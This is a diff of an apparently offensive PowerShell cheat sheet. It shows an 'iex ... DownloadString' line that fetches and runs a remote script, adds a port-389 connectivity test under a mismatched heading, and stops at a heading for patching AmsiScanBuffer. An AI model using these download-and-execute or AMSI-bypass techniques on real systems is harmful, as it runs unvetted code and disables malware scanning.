@@ -3,12 +3,16 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 ```
 
-
 # Download a script from an HTTP server
 ```powershell
 iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/ExPerfAnalyzer/main/ExPerfAnalyzer.ps1')
 ```
 
+# Download a script from an HTTP server
+```powershell
+Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
+```
+- [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 ```powershell
